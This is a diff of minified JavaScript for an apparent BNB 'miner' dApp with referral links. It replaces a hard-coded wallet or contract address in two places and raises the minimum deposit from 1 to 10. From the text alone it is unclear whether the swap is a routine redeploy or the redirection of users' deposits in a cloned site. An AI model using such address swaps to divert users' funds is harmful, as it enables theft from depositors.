@@ -29,7 +29,7 @@
 				m = (n(191), n(4)),
 				x = i.a.createContext();
 			"undefined" !== typeof window && (a = window.ethereum);
-			var h = "0xb356d32f30A99759961c631dd2053fA9Dc92a2B8",
+			var h = "0x8b2Df0a8C1F083Ea6dB0582547a59EE467dee125",
 				O = function() {
 					var e = new f.a.providers.Web3Provider(a);
 					e.getSigner();
@@ -349,7 +349,7 @@
 								return Object(p.a)().wrap((function(e) {
 									for (;;) switch (e.prev = e.next) {
 										case 0:
-											if (t.preventDefault(), r = t.target.bnbval.value, 1, !(r >= 1 && r <= 1e5)) {
+											if (t.preventDefault(), r = t.target.bnbval.value, 1, !(r >= 10 && r <= 1e5)) {
 												e.next = 28;
 												break
 											}
@@ -625,7 +625,7 @@
 						T = new URLSearchParams(A).get("ref") || "0x0000000000000000000000000000000000000000",
 						k = "https://yutuminer.netlify.app/?ref=",
 						B = (k.concat(T), k.concat(j)),
-						M = "0xb356d32f30A99759961c631dd2053fA9Dc92a2B8",
+						M = "0x8b2Df0a8C1F083Ea6dB0582547a59EE467dee125",
 						S = Object(r.useState)(null),
 						N = Object(u.a)(S, 2),
 						E = N[0],
